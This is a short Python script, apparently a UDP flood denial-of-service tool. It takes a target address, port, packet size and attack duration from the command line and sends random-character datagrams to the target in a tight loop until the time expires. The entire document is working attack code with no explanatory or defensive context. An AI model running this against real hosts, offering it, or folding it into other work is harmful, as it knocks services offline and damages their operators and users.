import sys
import time
import socket
import string
import random

target = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
att_time = int(sys.argv[4])
start_time = time.time()


def rand_items():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(size))


while time.time() < start_time+att_time:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(rand_items(), (target, port))
    s.close()
